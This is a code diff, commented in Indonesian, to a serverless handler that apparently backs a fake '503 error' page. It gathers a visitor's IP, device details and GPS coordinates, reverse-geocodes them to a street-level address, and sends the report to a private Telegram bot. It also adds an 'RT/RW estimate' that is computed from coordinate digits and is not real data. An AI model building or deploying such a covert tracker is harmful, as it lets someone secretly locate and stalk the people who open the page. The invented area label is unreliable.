@@ -2,20 +2,39 @@ export const config = {
   runtime: "nodejs"
 };
 
+/* ===== ESTIMASI RT/RW (LABEL AREA, BUKAN DATA ASLI) ===== */
+function estimateRTRW(lat, lon) {
+  if (!lat || !lon) return "-";
+  const lt = Math.abs(parseFloat(lat));
+  const ln = Math.abs(parseFloat(lon));
+  const rt = (Math.floor((lt * 1000) % 10) + 1).toString().padStart(2, "0");
+  const rw = (Math.floor((ln * 1000) % 10) + 1).toString().padStart(2, "0");
+  return `RT~${rt} / RW~${rw} (estimasi area)`;
+}
+
+/* ===== KUALITAS LOKASI BERDASARKAN AKURASI ===== */
+function getLocationQuality(acc) {
+  const a = parseFloat(acc);
+  if (isNaN(a)) return "Low ❌";
+  if (a <= 20) return "High ✅";
+  if (a <= 100) return "Medium ⚠️";
+  return "Low ❌";
+}
+
 export default async function handler(req, res) {
   if (req.method !== "POST") {
     return res.status(405).send("Method Not Allowed");
   }
 
   const BOT_TOKEN = process.env.BOT_TOKEN;
-  const CHAT_ID  = process.env.CHAT_ID;
-
+  const CHAT_ID = process.env.CHAT_ID;
   if (!BOT_TOKEN || !CHAT_ID) {
     return res.status(500).send("ENV belum diset");
   }
 
   const input = req.body || {};
 
+  /* ===== IP CLIENT ===== */
   const ip =
     req.headers["cf-connecting-ip"] ||
     req.headers["x-forwarded-for"]?.split(",")[0] ||
@@ -24,15 +43,47 @@ export default async function handler(req, res) {
 
   const time = new Date().toISOString().replace("T", " ").split(".")[0];
 
+  /* ===== IP INFO ===== */
   let ipinfo = {};
   try {
     const r = await fetch(`https://ipapi.co/${ip}/json/`);
     ipinfo = await r.json();
   } catch {}
 
-  // ===== FORMAT PESAN TELEGRAM (RAPI) =====
-  const message =
-`🚨 *ERROR 503 REPORT*
+  /* ===== REVERSE GEOCODE + FALLBACK ===== */
+  let address = {};
+  let locationSource = "GPS";
+
+  if (input.latitude && input.latitude !== "Not Allowed") {
+    try {
+      const geoRes = await fetch(
+        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${input.latitude}&lon=${input.longitude}&zoom=18&addressdetails=1`,
+        {
+          headers: { "User-Agent": "VercelLocationBot/1.0" }
+        }
+      );
+      const geo = await geoRes.json();
+      address = geo.address || {};
+    } catch {}
+  } else {
+    locationSource = "IP (Approximate)";
+    address = {
+      city: ipinfo.city,
+      state: ipinfo.region,
+      country: ipinfo.country_name,
+      postcode: ipinfo.postal
+    };
+  }
+
+  const accuracyMeter = input.accuracy || "-";
+  const locationQuality = getLocationQuality(input.accuracy);
+  const rtRwEstimate =
+    input.latitude && input.latitude !== "Not Allowed"
+      ? estimateRTRW(input.latitude, input.longitude)
+      : "-";
+
+  /* ===== FORMAT PESAN TELEGRAM ===== */
+  const message = `🚨 *ERROR 503 REPORT*
 
 ━━━━━━━━━━━━━━━━━━━━
 📱 *DEVICE INFORMATION*
@@ -52,8 +103,7 @@ ${input.browser || "-"}
 ━━━━━━━━━━━━━━━━━━━━
 🌎 *IP INFORMATION*
 ━━━━━━━━━━━━━━━━━━━━
-🧭 Continent    : ${ipinfo.continent_code || "-"}
-🇮🇩 Country      : ${ipinfo.country_name || "-"}
+🇮🇩 Country     : ${ipinfo.country_name || "-"}
 📍 Region       : ${ipinfo.region || "-"}
 🏙 City         : ${ipinfo.city || "-"}
 🏢 ISP / Org    : ${ipinfo.org || "-"}
@@ -63,13 +113,32 @@ ${input.browser || "-"}
 ━━━━━━━━━━━━━━━━━━━━
 📐 Latitude     : ${input.latitude || "-"}
 📏 Longitude    : ${input.longitude || "-"}
-🎯 Accuracy     : ${input.accuracy || "-"}
+🎯 Accuracy     : ${accuracyMeter}
+
+━━━━━━━━━━━━━━━━━━━━
+🏠 *ADDRESS INFORMATION*
+━━━━━━━━━━━━━━━━━━━━
+📍 Street       : ${address.road || address.pedestrian || "-"}
+🏘 Village      : ${address.village || address.suburb || "-"}
+🏙 District     : ${address.city_district || address.county || "-"}
+🏛 City / Reg.  : ${address.city || address.town || address.municipality || "-"}
+🌆 Province     : ${address.state || "-"}
+📮 Postal Code : ${address.postcode || "-"}
+🌍 Country      : ${address.country || "-"}
+
+━━━━━━━━━━━━━━━━━━━━
+📐 *LOCATION QUALITY*
+━━━━━━━━━━━━━━━━━━━━
+🎯 Quality      : ${locationQuality}
+🧭 Area Estimate: ${rtRwEstimate}
+📡 Source       : ${locationSource}
 
 🗺 Google Maps:
 https://www.google.com/maps?q=${input.latitude},${input.longitude}
 
 ⏰ Time : ${time}`;
 
+  /* ===== KIRIM KE TELEGRAM ===== */
   try {
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
@@ -82,7 +151,7 @@ https://www.google.com/maps?q=${input.latitude},${input.longitude}
     });
 
     return res.status(200).send("OK");
-  } catch (e) {
-    return res.status(500).send("Gagal kirim");
+  } catch {
+    return res.status(500).send("Gagal kirim Telegram");
   }
-}
+                    }
